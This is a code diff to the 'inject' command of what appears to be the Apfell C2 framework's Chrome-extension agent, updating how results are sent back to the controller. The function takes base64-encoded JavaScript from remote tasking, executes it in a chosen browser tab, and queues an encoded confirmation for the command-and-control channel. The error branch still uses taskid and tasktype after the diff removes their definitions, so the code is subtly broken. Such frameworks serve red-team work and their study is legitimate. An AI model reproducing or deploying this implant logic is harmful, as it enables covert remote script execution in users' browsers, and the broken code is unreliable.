@@ -1,23 +1,20 @@
-inject = function(params) {
+inject = function(task) {
     // execute custom javascript code in a tab
-    let args = JSON.parse(atob(params['data'].toString()));
+    let args = JSON.parse(atob(task['params'].toString()));
     const tab = Math.round(args["tabid"]);
     const code = atob(args["javascript"]);
-    let taskid = params['taskid'];
-    let tasktype = params['tasktype'];
     chrome.tabs.executeScript(tab, {
         code: code
     }, function(){
         if (chrome.runtime.lastError) {
             C2.sendError(taskid, tasktype);
         } else {
-            const started = btoa(unescape(encodeURIComponent(JSON.stringify({'status': 'started'}, null, 2))));
-            const apfellmsg = CreateApfellMessage(2, apfell.apfellID, apfell.UUID, started.length, taskid, tasktype, started);
-            let meta = {};
-            meta["metatype"] = 3;
-            meta["metadata"] = apfellmsg;
-            const metaenvelope = JSON.stringify(meta);
-            out.push(metaenvelope);
+            response = {"task_id":task['task_id'], "user_output":"injected code into tab with id " + tab, "completed": true};
+            outer_response = {"action":"post_response", "responses":[response], "delegates":[]};
+            enc = JSON.stringify(outer_response);
+            final = apfell.apfellid + enc;
+            msg = btoa(unescape(encodeURIComponent(final)));
+            out.push(msg);
         }
     });
 };
